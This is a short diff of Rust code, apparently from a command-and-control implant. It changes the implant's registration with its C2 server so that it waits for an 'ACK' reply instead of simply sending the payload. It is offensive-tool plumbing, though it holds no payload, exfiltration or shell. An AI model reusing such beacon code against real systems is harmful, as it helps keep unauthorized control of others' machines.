@@ -40,10 +40,16 @@ async fn register_self(c2com: &mut C2Com, identity: &Identity) {
         }
 
         match c2com::payloads::registration(identity) {
-            Ok(payload) => match c2com.send_bytes(payload).await {
-                Ok(()) => {
-                    println!(" - registration succeeded.");
-                    break;
+            Ok(payload) => match c2com.ask(payload).await {
+                Ok(response) => {
+                    if let Some(resp_data) = response
+                        && resp_data == b"ACK"
+                    {
+                        println!(" - registration succeeded.");
+                        break;
+                    }
+                    
+                    println!(" - improper response from c2 during registration.");
                 }
                 Err(err) => {
                     println!(" - registration failed. {err}");
